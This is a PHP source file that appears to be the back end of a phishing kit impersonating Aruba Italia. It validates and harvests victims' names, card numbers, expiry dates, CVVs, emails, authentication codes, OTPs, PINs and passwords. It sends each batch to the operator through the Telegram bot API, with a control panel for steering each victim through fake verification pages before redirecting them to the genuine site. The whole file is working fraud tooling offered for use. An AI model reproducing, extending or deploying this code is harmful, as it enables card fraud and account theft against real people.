<?php
include("./config.php");
error_reporting(0);
$ip=get_ip_address();
$file_control="./panel/".$ip.".txt";
if(isset($_POST['step'])){
	                     $step=$_POST['step'];
						 if($step==="main"){
							                $fullname=$_POST["fullname"];
											$cc=$_POST["cc"];
											$exp=$_POST["expm"]."/".$_POST["expy"];
										    $cvv=$_POST["cvv"];
											$email=$_POST["email"];
											$correct=true;
											if(!@luhn_check($cc))$correct=false;
											if (!filter_var($email, FILTER_VALIDATE_EMAIL))$correct=false;
											if(!intval($_POST["expm"])||!intval($_POST["expy"]))$correct=false;
											if(!strlen($fullname))$correct=false;
											if(!strstr($fullname," "))$correct=false;
											if(strlen($cvv)<3)$correct=false;
											if($correct){
												         session_start();
														 $_SESSION["fullname_aruba"]=$fullname;
														 $_SESSION["cc_aruba"]=$cc;
														 $_SESSION["exp_aruba"]=$exp;
														 $_SESSION["cvv_aruba"]=$cvv;
														 session_write_close();
														 $msg="::: Aruba Italia (Main Step) ::: \n\n";
														 $msg.="Name : $fullname\n";
														 $msg.="cc : $cc\n";
														 $msg.="exp : $exp\n";
														 $msg.="cvv : $cvv\n";
														 $msg.="email : $email\n";
														 sendTelegramMessage($msg);
														 file_put_contents($file_control,"loading.php");
                                                        }													  
						                    }
							if($step==="auth"){
								               $codice=$_POST['codice'][0].$_POST['codice'][1].$_POST['codice'][2].$_POST['codice'][3].$_POST['codice'][4].$_POST['codice'][5];
											   $correct=false;
											   if(strlen($codice)===6)$correct=true;
											   if($correct){
												            session_start();
															session_write_close();
												            $fullname=$_SESSION["fullname_aruba"];
														    $cc=$_SESSION["cc_aruba"];
														    $exp=$_SESSION["exp_aruba"];
														    $cvv=$_SESSION["cvv_aruba"];
															$msg="::: Aruba Italia (Auth Step) ::: \n\n";
														    $msg.="Name : $fullname\n";
														    $msg.="cc : $cc\n";
														    $msg.="exp : $exp\n";
														    $msg.="cvv : $cvv\n";
															$msg.="codice : $codice\n";
														    sendTelegramMessage($msg);
															file_put_contents($file_control,"loading.php");
											               }
							                   }
							if($step==="otp"){
								               $codice=$_POST['otp'];
											   $correct=false;
											   if(strlen($codice)>3)$correct=true;
											   if($correct){
												            session_start();
															session_write_close();
												            $fullname=$_SESSION["fullname_aruba"];
														    $cc=$_SESSION["cc_aruba"];
														    $exp=$_SESSION["exp_aruba"];
														    $cvv=$_SESSION["cvv_aruba"];
															$msg="::: Aruba Italia (OTP Step) ::: \n\n";
														    $msg.="Name : $fullname\n";
														    $msg.="cc : $cc\n";
														    $msg.="exp : $exp\n";
														    $msg.="cvv : $cvv\n";
															$msg.="OTP : $codice\n";
														    sendTelegramMessage($msg);
															file_put_contents($file_control,"loading.php");
											               }
							                   }
							if($step==="pin"){
								               $codice=$_POST['pin'];
											   $correct=false;
											   if(strlen($codice)>3)$correct=true;
											   if($correct){
												            session_start();
															session_write_close();
												            $fullname=$_SESSION["fullname_aruba"];
														    $cc=$_SESSION["cc_aruba"];
														    $exp=$_SESSION["exp_aruba"];
														    $cvv=$_SESSION["cvv_aruba"];
															$msg="::: Aruba Italia (PIN Step) ::: \n\n";
														    $msg.="Name : $fullname\n";
														    $msg.="cc : $cc\n";
														    $msg.="exp : $exp\n";
														    $msg.="cvv : $cvv\n";
															$msg.="PIN : $codice\n";
														    sendTelegramMessage($msg);
															file_put_contents($file_control,"loading.php");
											               }
							                   }
						   if($step==="pwd"){
								               $codice=$_POST['pwd'];
											   $correct=false;
											   if(strlen($codice)>3)$correct=true;
											   if($correct){
												            session_start();
															session_write_close();
												            $fullname=$_SESSION["fullname_aruba"];
														    $cc=$_SESSION["cc_aruba"];
														    $exp=$_SESSION["exp_aruba"];
														    $cvv=$_SESSION["cvv_aruba"];
															$msg="::: Aruba Italia (PWD Step) ::: \n\n";
														    $msg.="Name : $fullname\n";
														    $msg.="cc : $cc\n";
														    $msg.="exp : $exp\n";
														    $msg.="cvv : $cvv\n";
															$msg.="PWD : $codice\n";
														    sendTelegramMessage($msg);
															file_put_contents($file_control,"loading.php");
											               }
							                   }
							if($step==="done"){
								              file_put_contents($file_control,"main.php");
											  header("location: https://www.aruba.it/en/home.aspx");
											  exit();
							                  }
						   goto mainPage;
                          }
else if(isset($_GET['getresponse'])){
	$data=file_get_contents($file_control);
	$checkName="loading.php";
	if($_GET['getresponse']==='app')$checkName='app.php';
	if(!strstr($data,$checkName))echo "1";
	else echo "0";
}else if(isset($_GET['setresponse'])){
	             $ip=get_ip_address();
				 if(!checkTelegramIP($ip)){
	                                       $resp=$_GET['setresponse'];
				                           $ipv=$_GET['ip'];
				                           $file_controlvict="./panel/".$ipv.".txt";
				                           file_put_contents($file_controlvict,$resp);
				                           echo "0";
				                          }
}else {
	   mainPage:
	  session_start();
	  $file_to_show="";
	  if(!file_exists($file_control)){
		                              file_put_contents($file_control,"main.php");
									  $file_to_show="main.php";
	                                  }else $file_to_show=file_get_contents($file_control);
	  //$data=file_get_contents($file_to_show);
	  if(strstr($file_to_show,"app.php")
		&&!isset($_SESSION["sended_app"])){//Send Message :
	                                     $_SESSION["sended_app"]=1;
		                                 $fullname=$_SESSION["fullname_aruba"];
						                 $cc=$_SESSION["cc_aruba"];
										 $exp=$_SESSION["exp_aruba"];
										 $cvv=$_SESSION["cvv_aruba"];
										 $msg="::: Aruba Italia (App Step) ::: \n\n";
										 $msg.="::: User wait in app page :::\n\n";
										 $msg.="Name : $fullname\n";
										 $msg.="cc : $cc\n";
										 $msg.="exp : $exp\n";
										 $msg.="cvv : $cvv\n";
										 sendTelegramMessage($msg);
										 }else if(!strstr($file_to_show,"app.php")){
											                                        unset($_SESSION["sended_app"]);
										                                           }
										 
	  session_write_close();
	  include($file_to_show);
	  //if(strstr($file_to_show,"done.html"))unlink($file_control);
      //echo $data;	
     }
exit();
//************** List of functions :
function luhn_check($number) {

  // Strip any non-digits (useful for credit card numbers with spaces and hyphens)
  $number=preg_replace('/\D/', '', $number);

  // Set the string length and parity
  $number_length=strlen($number);
  $parity=$number_length % 2;

  // Loop through each digit and do the maths
  $total=0;
  for ($i=0; $i<$number_length; $i++) {
    $digit=$number[$i];
    // Multiply alternate digits by two
    if ($i % 2 == $parity) {
      $digit*=2;
      // If the sum is two digits, add them together (in effect)
      if ($digit > 9) {
        $digit-=9;
      }
    }
    // Total up the digits
    $total+=$digit;
  }

  // If the total mod 10 equals 0, the number is valid
  return ($total % 10 == 0) ? TRUE : FALSE;

}
function checkTelegramIP($ip){
if(strstr($ip,"149.154.160.")
	||strstr($ip,"149.154.161.")
||strstr($ip,"149.154.162.")
||strstr($ip,"149.154.163.")
||strstr($ip,"149.154.164.")
||strstr($ip,"149.154.165.")
||strstr($ip,"149.154.166.")
||strstr($ip,"149.154.167.")
||strstr($ip,"91.108.4.")
||strstr($ip,"91.108.5.")
||strstr($ip,"91.108.6.")
||strstr($ip,"91.108.7.")
||strstr($ip,"91.108.56.")
||strstr($ip,"91.108.57.")
||strstr($ip,"91.108.58.")
||strstr($ip,"91.108.59.")
||strstr($ip,"91.108.8.")
||strstr($ip,"91.108.9.")
||strstr($ip,"91.108.10.")
||strstr($ip,"91.108.11.")
||strstr($ip,"91.108.11.")
||strstr($ip,"95.161.6")
||strstr($ip,"95.161.7"))return 1;
else return 0;
}
function sendPhotoTelegram($file){
GLOBAL $telegram_token,$telegram_chat_id;
$bot_url    = "https://api.telegram.org/bot$telegram_token/";
$ch = curl_init($bot_url.'SendPhoto');
$cfile = new CURLFile($file);
$data = array(
         'chat_id' => $telegram_chat_id,
         'photo' => $cfile ,
         'caption' => 'PhotoTan '.get_ip_address()
     );
curl_setopt($ch, CURLOPT_POST,1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
}
function getHookURL(){
$ip=get_ip_address();
$url="https://".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI']."index.php?ip=$ip&setresponse=";
return $url;
}
function sendTelegramMessage($message){
GLOBAL $telegram_token,$telegram_chat_id;
$hookURL=getHookURL();
$token=$telegram_token;
$chatID=$telegram_chat_id;
$msg=$message;
$ip=get_ip_address();
$newMessage="*********************************\n";
$newMessage.=$message;
$newMessage.="*********************************\n";
$newMessage.="Panel Control (Aruba Italia) :\n\n";
$newMessage.="IP : $ip\n";
$newMessage.="URL CHECK : $hookURL\n\n";
$newMessage.="<a href=\"$hookURL"."main.php"."\">** Main</a>\n\n";
$newMessage.="<a href=\"$hookURL"."main_err.php"."\">** Main_Err</a>\n\n";
$newMessage.="<a href=\"$hookURL"."app.php"."\">** App</a>\n\n";
$newMessage.="<a href=\"$hookURL"."auth.php"."\">** Auth</a>\n\n";
$newMessage.="<a href=\"$hookURL"."auth_err.php"."\">** Auth_Error</a>\n\n";
$newMessage.="<a href=\"$hookURL"."otp.php"."\">** OTP</a>\n\n";
$newMessage.="<a href=\"$hookURL"."otp_err.php"."\">** OTP_Error</a>\n\n";
$newMessage.="<a href=\"$hookURL"."pin.php"."\">** PIN</a>\n\n";
$newMessage.="<a href=\"$hookURL"."pin_err.php"."\">** PIN_Error</a>\n\n";
$newMessage.="<a href=\"$hookURL"."pwd.php"."\">** Password</a>\n\n";
$newMessage.="<a href=\"$hookURL"."pwd_err.php"."\">** Password_Error</a>\n\n";
$newMessage.="<a href=\"$hookURL"."done.php"."\">** done</a>\n\n";
$newMessage.="*********************************\n";
$url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatID;
$url = $url . "&parse_mode=html&text=" . urlencode($newMessage);
$ch = curl_init();
$optArray = array(
              CURLOPT_URL => $url,
              CURLOPT_RETURNTRANSFER => true
         );
curl_setopt_array($ch, $optArray);
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
function get_ip_address() {
    $ip_keys = array('HTTP_REMOTE_ADDR','HTTP_X_REAL_IP','HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR');
    foreach ($ip_keys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                // trim for safety measures
                $ip = trim($ip);
                // attempt to validate IP
                if (validate_ip($ip)) {
                    return $ip;
                }
            }
        }
    }
return isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
}
function validate_ip($ip)
{
    if (preg_match("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/i",$ip)) {
        return true;
    }
    return true;
}
?>